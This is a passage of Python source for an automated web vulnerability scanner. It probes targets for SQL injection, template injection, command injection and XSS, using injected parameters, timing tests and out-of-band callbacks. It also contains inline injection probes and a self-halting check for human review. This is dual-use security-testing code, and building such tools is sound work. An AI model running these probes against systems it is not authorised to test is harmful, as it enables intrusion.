                        f"2. Access results at {match['url']} to extract sensitive data",
                        "3. Mass PII harvesting via automated enumeration",
                    ],
                )
                if cf:
                    cf["chains"] = True
                    cf["impact"] = "Massive personal data breach via predictable ID enumeration."
                    chains_found.append(cf)
                break

        existing_titles = {f.get("title", "") for f in findings}
        for cf in chains_found:
            if cf.get("title", "") not in existing_titles:
                findings.append(cf)
                existing_titles.add(cf.get("title", ""))
        return findings

    # ── Self-Halting Conditions ───────────────────────────────────────

    @staticmethod
    def check_self_halt(findings: list) -> list:
        """Check for dangerous findings that should halt active testing and flag for human review."""
        halted = []
        for f in findings:
            vuln_type = f.get("vuln_type", "").lower()
            severity = f.get("severity", "").lower()
            stage = f.get("verification_stage", "").lower()

            # Dangerous patterns: SQLi OOB confirmed + critical severity
            ev_list = f.get("evidence", [])
            if not isinstance(ev_list, list):
                ev_list = [str(ev_list)] if ev_list else []
            has_oob = any("oob" in str(ev).lower() for ev in ev_list)
            if "sql" in vuln_type and stage in ("exploitable", "verified") and has_oob:
                f["title"] = f["title"] + " — Identified: exploitation withheld pending human review"
                f["details"] = f["details"] + " | ⚠ This finding was confirmed via OOB. Further exploitation (data extraction, writes) withheld pending human review per self-halting policy."
                f["impact"] = "CRITICAL: SQL injection confirmed with out-of-band data exfiltration capability. Automated exploitation withheld — requires manual review."
                f["self_halted"] = True
                halted.append(f)

            # Critical SSRF with cloud metadata access
            if "ssrf" in vuln_type and stage in ("exploitable", "verified"):
                f["title"] = f["title"] + " — Identified: exploitation withheld pending human review"
                f["details"] = f["details"] + " | ⚠ SSRF confirmed. Further exploitation (cloud metadata, internal port scanning) withheld pending human review."
                f["impact"] = "CRITICAL: SSRF with out-of-band confirmation. Automated exploitation withheld — requires manual review."
                f["self_halted"] = True
                halted.append(f)

        if halted:
            log(f"  [Self-Halt] {len(halted)} finding(s) flagged for human review — exploitation withheld.", Colors.RED)
        return findings

    # ── Legacy Backward-Compat Helpers (used by ApiScanner, IdorScanner) ──

    def _append_finding(self, findings_list: list, f: Optional[_Finding]) -> None:
        if f:
            findings_list.append(f)

    def _record_confirmed(self, findings_list: list, vuln_type: str, url: str,
                          severity: str, details: str, evidence: str,
                          method: str, request_data: Any = None,
                          response_excerpt: str = "",
                          steps_to_reproduce: Optional[list] = None,
                          parameter: Optional[str] = None) -> None:
        request_str = ""
        if method and url:
            req_headers = dict(self.session.headers) if hasattr(self, 'session') else {}
            req_cookies = safe_cookies_dict(self.session.cookies) if hasattr(self, 'session') else {}
            if request_data is not None:
                import json
                data_str = json.dumps(request_data) if isinstance(request_data, (dict, list)) else str(request_data)
                request_str = _build_curl(method, url, req_headers, data=data_str, cookies=req_cookies)
            else:
                request_str = _build_curl(method, url, req_headers, cookies=req_cookies)
        f = finding(
            vuln_type=vuln_type, url=url, severity=severity,
            details=details, evidence=evidence,
            verification_stage=VerificationStage.VALIDATED.value,
            request=request_str,
            response_excerpt=response_excerpt or "",
            steps_to_reproduce=steps_to_reproduce or [f"Send {method} request to {url}"],
            parameter=parameter or "",
        )
        self._append_finding(findings_list, f)

    def _deduplicate(self, findings_list: list[_Finding]) -> list[_Finding]:
        seen = set()
        result = []
        for f in findings_list:
            fp = f.get("fingerprint", "") or hashlib.sha256(
                f"{f.get('vuln_type', '')}:{f.get('url', '')}:{f.get('parameter', '')}".encode()
            ).hexdigest()
            if fp not in seen:
                seen.add(fp)
                result.append(f)
        return result

    # ── Helpers ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _normalize_list(self, value):
        if value is None:
            return []
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        if isinstance(value, list):
            return value
        return [value]

    def _get_module_param(self, module_name, key, default=None):
        return self.config.get("module_params", {}).get(module_name, {}).get(key, default)

    def _load_payloads(self, payload_type: str) -> Any:
        """Load payloads from YAML file with inline fallback.

        Handles both flat lists and nested dict payloads.  Nested dicts
        (category-based grouping) are flattened into a single ordered list
        by concatenating category values in insertion order.

        For payload types whose fallback is a dict (sqli, xss, xxe, ssti,
        cmdi) the raw dict is returned as-is so that callers can access
        individual categories via .get("category", []).  For list-fallback
        types (lfi, ssrf) the result is always flattened.

        Args:
            payload_type: One of 'sqli', 'xss', 'lfi', 'ssrf', 'xxe', 'ssti', 'cmdi'

        Returns:
            Parsed payload structure (dict or list) from YAML, or the inline
            default constant (DEFAULT_SQLI_PAYLOADS, DEFAULT_XSS_PAYLOADS, etc.)
        """
        yaml_path = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "payloads", f"{payload_type}.yaml"
        )
        list_types = {"lfi", "ssrf"}
        try:
            with open(yaml_path, "r") as f:
                loaded = yaml.safe_load(f)
            if loaded and "payloads" in loaded:
                raw = loaded["payloads"]
                if isinstance(raw, dict) and payload_type in list_types:
                    flat = []
                    for cat in raw.values():
                        if isinstance(cat, list):
                            flat.extend(cat)
                    if flat:
                        return flat
                if isinstance(raw, (dict, list)):
                    return raw
        except (FileNotFoundError, yaml.YAMLError):
            pass

        fallbacks = {
            "sqli": DEFAULT_SQLI_PAYLOADS,
            "xss": DEFAULT_XSS_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "xxe": XXE_PAYLOADS,
            "ssti": SSTI_PAYLOADS,
            "cmdi": CMD_INJECTION_PAYLOADS,
        }
        fb = fallbacks.get(payload_type, [])
        if self.verbose:
            log(f"[*] Payload YAML for '{payload_type}' not found or empty — using hardcoded fallback",
                Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        return fb

    def _in_scope(self, url: str) -> bool:
        return url_in_scope(url, self.config)

    def _extract_param_name(self, f) -> str:
        texts: list[str] = [f.get("details", "")]
        ev = f.get("evidence", [])
        if isinstance(ev, list):
            texts.extend(str(e) for e in ev if isinstance(e, str))
        else:
            texts.append(str(ev))
        for text in texts:
            if "Parameter '" in text:
                return text.split("Parameter '")[1].split("'")[0]
            if "Form field '" in text:
                return text.split("Form field '")[1].split("'")[0]
        url = f.get("url", "")
        if "?" in url:
            params = parse_qs(urlparse(url).query)
            if params:
                return next(iter(params.keys()))
        return ""

    def _run_threaded(self, fn, items):
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    def _prepare_scan(self) -> None:
        if self._prepared:
            return
        self._prepared = True
        self._detect_waf()
        self._fingerprint_baselines()
        self._fingerprint_tech()
        self._log_tech_fingerprints()

    def _detect_waf(self) -> None:
        target = self.config.get("target", "")
        if not target:
            return
        if self.config.get("stealth"):
            log("[*] WAF detection skipped in stealth mode", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            self.waf_detected = True
            return
        log("[*] WAF probe: testing root URL with 2 detection payloads", Colors.CYAN, verbose_only=True, verbose=self.verbose)
        safe_url = target.rstrip("/") + "/"
        blocked = 0
        for probe in ("' OR 1=1--", "<script>alert(1)</script>"):
            try:
                r = safe_get(self.session, safe_url + "?" + urlencode({"q": probe}),
                             self.timeout, raise_for_status=False)
                if r and r.status_code in (403, 406, 429):
                    blocked += 1
            except Exception:
                continue
        if blocked >= 2:
            self.waf_detected = True
            log("[!] WAF detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

    def _fingerprint_baselines(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.baselines.fingerprint(url)
            except Exception:
                continue

    def _fingerprint_tech(self) -> None:
        for url in self.recon.get("urls", []):
            try:
                self.tech_fingerprinter.fingerprint(url)
            except Exception:
                continue
        self.config["technology"] = self.tech_fingerprinter.all()

    def _log_tech_fingerprints(self) -> None:
        summary = self.tech_fingerprinter.summary()
        if summary and summary != "Unknown":
            log(f"  [Tech] {summary}", Colors.CYAN, verbose_only=True, verbose=self.verbose)

    def _get_target_scheme(self):
        return urlparse(self.config.get("target", "")).scheme.lower()

    def _same_origin(self, action_url: str) -> bool:
        target = urlparse(self.config.get("target", ""))
        action = urlparse(action_url)
        return action.netloc == "" or action.netloc == target.netloc

    # ═════════════════════════════════════════════════════════════════════
    # SSTI — 4-Stage Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_ssti(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("ssti", target_urls)
        if result is not None:
            return result
        return []

    def _ssti_test_parameter(self, url: str, param: str,
                             request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        ssti_payloads = self._load_payloads("ssti")
        # Stage 1: Arithmetic reflection detection
        arithmetic_results = []
        for payload in ssti_payloads.get("arithmetic", SSTI_PAYLOADS.get("arithmetic", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text

            # Check for arithmetic result (7*7 → 49)
            arithmetic_expected = payload.replace("7*7", "49").replace("7+7", "14").replace("7-7", "0")
            arithmetic_possible = any(e in body for e in ["49", "14", "0"])
            raw_payload_absent = payload not in body
            if arithmetic_possible and raw_payload_absent:
                arithmetic_results.append(("arithmetic", f"{payload} → evaluated", test_url, body))
            elif payload in body:
                arithmetic_results.append(("reflection", payload, test_url, body))

        if not arithmetic_results:
            return None

        has_arithmetic = any(r[0] == "arithmetic" for r in arithmetic_results)
        # Override response_excerpt with the arithmetic triggering response (not baseline)
        if has_arithmetic:
            for r in arithmetic_results:
                if r[0] == "arithmetic":
                    response_excerpt_str = r[3][:500]
                    break

        # Stage 2: Engine fingerprinting
        engine_sigs = []
        for engine, payload, expected in ssti_payloads.get("engine_fingerprint", SSTI_PAYLOADS.get("engine_fingerprint", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if resp and expected and expected in resp.text:
                engine_sigs.append(engine)
            elif resp and payload in resp.text:
                engine_sigs.append(f"reflected_{engine}")

        # Stage 3: Verify evaluation (match engine patterns against engine_fingerprint responses)
        verified_engine = None
        engine_bodies = []
        for engine_name, fp_payload, expected in ssti_payloads.get("engine_fingerprint", SSTI_PAYLOADS.get("engine_fingerprint", [])):
            test_url = self._inject_param(url, param, fp_payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if resp:
                engine_bodies.append((engine_name, resp.text))
        for engine, pattern_list in SSTI_ENGINE_PATTERNS.items():
            for pattern in pattern_list:
                for eng_name, body in engine_bodies:
                    if pattern.search(body):
                        verified_engine = engine
                        break
                if verified_engine:
                    break
            if verified_engine:
                break

        # Stage 4: Read-proof attempt (safe, non-destructive)
        read_proof = []
        if verified_engine or has_arithmetic:
            for payload in ssti_payloads.get("read_proof", SSTI_PAYLOADS.get("read_proof", [])):
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if resp and len(resp.text) > 500 and payload not in resp.text:
                    read_proof.append(payload)

        # Determine confidence tier
        if verified_engine and read_proof:
            title = "Confirmed SSTI"
            severity = "critical"
            evidence = f"Engine: {verified_engine}, Arithmetic: true, Read-proof: {' '.join(read_proof[:2])}"
            stage = VerificationStage.EXPLOITABLE.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine fingerprinted as {verified_engine}",
                f"Stage 3: Engine-specific evaluation verified",
                f"Stage 4: Read-proof payloads produced output",
            ]
        elif verified_engine or has_arithmetic:
            title = "Likely SSTI"
            severity = "high"
            evidence = f"Arithmetic: {has_arithmetic}, Engine sigs: {', '.join(engine_sigs[:3])}"
            stage = VerificationStage.VALIDATED.value
            vsteps = [
                f"Stage 1: Arithmetic reflection detected",
                f"Stage 2: Engine signals: {', '.join(engine_sigs[:3])}",
                f"Stage 3: Evaluation suspected",
            ]
        else:
            title = "Potential SSTI"
            severity = "medium"
            evidence = f"Payloads reflected: {', '.join(r[1][:40] for r in arithmetic_results[:2])}"
            stage = VerificationStage.DETECTED.value
            vsteps = [
                f"Stage 1: Template syntax reflected in response",
            ]

        return finding(
            vuln_type=title,
            url=list(set(r[2] for r in arithmetic_results))[0],
            severity=severity,
            details=f"Parameter '{param}': {title.lower()} detected",
            evidence=evidence,
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=vsteps,
        )

    # ═════════════════════════════════════════════════════════════════════
    # SQLi — Multi-Signal Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_sqli(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("sqli", target_urls)
        if result is not None:
            return result
        return []

    def _sqli_test_parameter(self, url: str, param: str, original_value: str,
                              payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str]]:
        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": False}
        evidence_parts = []
        triggering_response: Optional[str] = None

        # ── Error-based (with baseline comparison) ────────────────────
        baseline_resp = safe_get(self.session, url, self.timeout)
        baseline_sql_errors: set[str] = set()
        if baseline_resp:
            lower_baseline = baseline_resp.text.lower()
            baseline_sql_errors = {err for err in SQLI_ERRORS if err in lower_baseline}
        for payload in payloads.get("error_based", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            lower_body = resp.text.lower()
            matched = [err for err in SQLI_ERRORS if err in lower_body and err not in baseline_sql_errors]
            if matched:
                signals["error"] = True
                evidence_parts.append(f"error:{matched[0]}")
                triggering_response = resp.text[:500]
                break

        # ── Boolean-based ────────────────────────────────────────────
        boolean_pairs = payloads.get("boolean_based", [])
        if boolean_pairs:
            baseline = safe_get(self.session, url, self.timeout)
            if baseline:
                baseline_hash = hashlib.md5(baseline.text.encode()).hexdigest()
                baseline_len = len(baseline.text)
                for true_cond, false_cond in boolean_pairs:
                    true_url = self._inject_param(url, param, f"{original_value} {true_cond}")
                    false_url = self._inject_param(url, param, f"{original_value} {false_cond}")
                    true_resp = safe_get(self.session, true_url, self.timeout)
                    false_resp = safe_get(self.session, false_url, self.timeout)
                    if not (true_resp and false_resp):
                        continue
                    true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
                    false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    true_normal = baseline_hash == true_hash
                    false_diff = baseline_hash != false_hash
                    if true_normal and false_diff:
                        signals["boolean"] = True
                        evidence_parts.append("boolean:AND 1=1 vs AND 1=2 diff")
                        triggering_response = false_resp.text[:500]
                        break

        # ── Time-based (baseline comparison) ─────────────────────────
        baseline_start = time.time()
        safe_get(self.session, url, 15, raise_for_status=False)
        baseline_delay = time.time() - baseline_start
        for payload in payloads.get("time_based", []):
            test_url = self._inject_param(url, param, payload)
            delays = []
            time_resp = None
            for _ in range(2):
                start = time.time()
                time_resp = safe_get(self.session, test_url, 15, raise_for_status=False)
                delays.append(time.time() - start)
            min_delay = min(delays)
            if min_delay > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                signals["time"] = True
                evidence_parts.append(f"time:delays={delays}, baseline={baseline_delay:.2f}s")
                if time_resp:
                    triggering_response = time_resp.text[:500]
                break

        # ── UNION-based (column counting via ORDER BY + UNION SELECT NULL) ──
        for payload in payloads.get("union", []):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            if "union" in evidence_parts:
                continue
            lower = resp.text.lower()
            # ORDER BY N success = no error. ORDER BY N failure = error.
            if "order by" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    # ORDER BY succeeded at this column count — good sign
                    evidence_parts.append(f"union:order_by_ok:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    continue
            # UNION SELECT NULL... success = different content than normal
            if "union select" in payload.lower() and "null" in payload.lower():
                if not any(err in lower for err in SQLI_ERRORS):
                    # UNION succeeded — column count matches
                    evidence_parts.append(f"union:matching_columns:{payload}")
                    signals["union"] = True
                    triggering_response = resp.text[:500]
                    break

        # ── OOB ──────────────────────────────────────────────────────
        if oob_host:
            for payload in payloads.get("oob", []):
                formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, formatted)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("sqli", formatted, test_url)
                # Delay then poll for callback — OOB provides strongest evidence
                time.sleep(1)
                callbacks = self.oob.poll()
                if callbacks:
                    signals["oob"] = True
                    evidence_parts.append(f"oob:callback received from {oob_host}")
                else:
                    evidence_parts.append(f"oob:sent to {oob_host} (no callback yet)")
                break

        return signals, triggering_response

    def _sqli_build_finding(self, url: str, param: str, signals: dict,
                            original_value: str = "1",
                            request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = []
        for k, v in signals.items():
            if v:
                evidence_parts.append(k)

        # OOB confirmed is the strongest signal — critical regardless of other signals
        if signals.get("oob"):
            title = "Confirmed SQL Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.VERIFIED.value
        elif signal_count >= 3:
            title = "SQL Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 2:
            title = "Likely SQL Injection"
            severity = "high"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential SQL Injection"
            severity = "medium"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        f = finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) detected ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )
        if f:
            f["original_value"] = original_value
        return f

    def _sqli_test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
        """Test POST endpoints with SQLi payloads in JSON, XML, and form bodies."""
        post_payloads = POST_SQLI_PAYLOADS

        # Baseline: neutral POST to capture pre-existing SQL error noise
        baseline_errors: set[str] = set()
        try:
            baseline_resp = safe_post(self.session, url, data=json.dumps({"id": "1"}), headers={"Content-Type": "application/json"}, timeout=self.timeout)
            if baseline_resp:
                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
        except Exception:
            pass

        headers = {"Content-Type": "application/json"}
        for payload in post_payloads["json"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._sqli_build_finding(url, "POST JSON body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._add(f)
                break

        headers = {"Content-Type": "application/xml"}
        for payload in post_payloads["xml"]:
            resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
            if resp:
                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                if new_errors:
                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                    f = self._sqli_build_finding(url, "POST XML body", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                    if f:
                        self._add(f)
                break

        # Try form fields from recon first, then fall back to hardcoded
        form_fields: list[str] = []
        for form in (self.recon.get("forms", []) or []):
            form_action = form.get("action", "")
            if form_action and (form_action in url or url in form_action):
                for field in form.get("fields", []):
                    ftype = field.get("type", "").lower()
                    fname = field.get("name", "")
                    if fname and ftype in ("text", "search", "email", "number", ""):
                        form_fields.append(fname)
        if not form_fields:
            form_fields = ["id", "query", "search", "email", "filter", "name"]
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        for payload in post_payloads["form"]:
            for field_name in form_fields:
                post_data = {field_name: payload}
                resp = safe_post(self.session, url, data=post_data, headers=headers, timeout=self.timeout)
                if resp:
                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
                    if new_errors:
                        signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
                        f = self._sqli_build_finding(url, f"POST form body ({field_name})", signals,
                        request_str=_build_curl("POST", url, dict(self.session.headers), data=post_data, cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._add(f)
                        break
            else:
                continue
            break

        # OOB variants for POST bodies
        if oob_host:
            oob_payloads = payloads.get("oob", [])
            for oob_p in oob_payloads:
                formatted = oob_p.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                resp = safe_post(self.session, url, data=json.dumps({"id": formatted}),
                                 headers={"Content-Type": "application/json"}, timeout=self.timeout)
                if resp:
                    time.sleep(1)
                    if self.oob.poll():
                        signals = {"error": False, "boolean": False, "time": False, "union": False, "oob": True}
                        f = self._sqli_build_finding(url, "POST JSON body (OOB)", signals,
                            request_str=_build_curl("POST", url, dict(self.session.headers), data=json.dumps({"id": formatted}), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt_str=resp.text[:500] if resp else "")
                        if f:
                            self._add(f)
                        break

    # ═════════════════════════════════════════════════════════════════════
    # Second-Order Injection Tracking
    # ═════════════════════════════════════════════════════════════════════

    def _record_second_order(self, url: str, param: str, payload: str) -> None:
        """Record a submitted payload that may be stored (second-order)."""
        key = url.split("?")[0]
        self._second_order_store.setdefault(key, []).append({
            "param": param,
            "payload": payload,
            "submitted_at": time.time(),
        })

    def _check_second_order(self) -> None:
        """Re-request pages to find delayed reflections of stored payloads."""
        delay = 3  # seconds to wait before checking
        time.sleep(delay + 1)
        for base_url, entries in list(self._second_order_store.items()):
            if not self._in_scope(base_url):
                continue
            resp = safe_get(self.session, base_url, self.timeout)
            if not resp:
                continue
            for entry in entries:
                payload = entry["payload"]
                if payload in resp.text and payload not in self.recon.get("body", ""):
                    f = finding(
                        vuln_type="Second-Order Injection",
                        url=base_url,
                        severity="high",
                        details=f"Stored payload reflected in {base_url}",
                        evidence=f"Payload: {payload} | Submitted via param: {entry['param']}",
                        request=_build_curl("GET", base_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500],
                        parameter=entry['param'],
                        steps_to_reproduce=[f"Send request to {base_url}", f"Observe payload reflection: {payload[:80]}"],
                        verification_stage=VerificationStage.VALIDATED.value,
                        validation_steps=[f"Payload '{payload}' submitted via {entry['param']} then reflected on {base_url}"],
                    )
                    if f:
                        self._add(f)
                    break

    # ═════════════════════════════════════════════════════════════════════
    # SSRF — OOB-Only Confirmation
    # ═════════════════════════════════════════════════════════════════════

    def _calculate_ssrf_confidence(self, matched: list[str], baseline_diff: bool,
                                    json_detected: bool, credentials_found: bool) -> int:
        """Evidence-based confidence scoring for SSRF findings."""
        score = 0
        if matched:
            score += 10
        if baseline_diff:
            score += 20
        if json_detected:
            score += 30
        if credentials_found:
            score += 40
        return min(score, 100)

    def scan_ssrf(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("ssrf", target_urls)
        if result is not None:
            return result
        return []

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    # ═════════════════════════════════════════════════════════════════════
    # XXE — In-Band + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_xxe(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("xxe", target_urls)
        if result is not None:
            return result
        return []

    # ═════════════════════════════════════════════════════════════════════
    # Command Injection — Output + Time-Based + OOB Detection
    # ═════════════════════════════════════════════════════════════════════

    def scan_command_injection(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("cmd_injection", target_urls)
        if result is not None:
            return result
        return []

    def _cmd_injection_test_parameter(self, url: str, param: str,
                                      oob_host: Optional[str]) -> tuple[Dict[str, bool], Optional[str]]:
        cmdi_payloads = self._load_payloads("cmdi")
        signals: Dict[str, bool] = {"output": False, "time": False, "oob": False}
        evidence_parts = []
        triggering_response: Optional[str] = None

        # Output-based detection
        for payload, expected in cmdi_payloads.get("unix", CMD_INJECTION_PAYLOADS.get("unix", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text
            if expected and expected in body:
                signals["output"] = True
                evidence_parts.append(f"output:{expected}")
                triggering_response = resp.text[:500]
                break
            for sig in CMD_INJECTION_OUTPUT_SIGNATURES:
                if sig in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{sig}")
                    triggering_response = resp.text[:500]
                    break
            if signals["output"]:
                break

        if not signals["output"]:
            for payload, expected in cmdi_payloads.get("windows", CMD_INJECTION_PAYLOADS.get("windows", [])):
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if expected and expected in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{expected}")
                    triggering_response = resp.text[:500]
                    break
                for sig in CMD_INJECTION_OUTPUT_SIGNATURES_WIN:
                    if sig in body:
                        signals["output"] = True
                        evidence_parts.append(f"output:{sig}")
                        triggering_response = resp.text[:500]
                        break

        # Time-based detection (with baseline comparison)
        if not signals["output"] and not triggering_response:
            baseline_start = time.time()
            safe_get(self.session, url, timeout=15, raise_for_status=False)
            baseline_delay = time.time() - baseline_start
            for payload, min_delay in cmdi_payloads.get("time_based", CMD_INJECTION_PAYLOADS.get("time_based", [])):
                test_url = self._inject_param(url, param, payload)
                delays = []
                time_resp = None
                for _ in range(2):
                    start = time.time()
                    time_resp = safe_get(self.session, test_url, timeout=15, raise_for_status=False)
                    delays.append(time.time() - start)
                min_delay = min(delays)
                if min_delay > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                    signals["time"] = True
                    evidence_parts.append(f"time:delays={[round(d, 1) for d in delays]}, baseline={baseline_delay:.2f}s")
                    if time_resp:
                        triggering_response = time_resp.text[:500]
                    break

        # OOB-based detection (always runs regardless of other signals)
        if oob_host:
            for payload_template in cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", [])):
                payload = payload_template.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
                test_url = self._inject_param(url, param, payload)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.oob.register_interaction("cmd_injection", payload, test_url)
                time.sleep(1)
                callbacks = self.oob.poll()
                if callbacks:
                    signals["oob"] = True
                    evidence_parts.append(f"oob:callback received from {oob_host}")
                else:
                    evidence_parts.append(f"oob:sent to {oob_host} (no callback yet)")
                break

        return signals, triggering_response

    def _cmd_injection_build_finding(self, url: str, param: str,
                                     signals: Dict[str, bool],
                                     request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signals.get("oob"):
            title = "Confirmed Command Injection (OOB)"
            severity = "critical"
            stage = VerificationStage.EXPLOITABLE.value
        elif signal_count >= 2:
            title = "Command Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential Command Injection"
            severity = "high"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        return finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            validation_steps=[f"Signal: {s}" for s in evidence_parts],
        )

    # ═════════════════════════════════════════════════════════════════════
    # XSS — Context Detection + Headless Validation
    # ═════════════════════════════════════════════════════════════════════

    def scan_xss(self, target_urls: list[str] | None = None) -> list[dict]:
        result = self._dispatch_to_scanner("xss", target_urls)
        if result is not None:
            return result
        return []

    def _detect_xss_context(self, body: str, payload: str) -> Optional[str]:
        """Detect the context in which the payload is reflected."""
        if payload not in body:
            return None
        # Check script context
        for match in re.finditer(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL):
            if payload in match.group():
                return "javascript"
        # Check attribute context
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        # Check URL context
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        # Check event handler context
        if re.search(r"on\w+\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "html"
        # Default HTML context
        return "html"

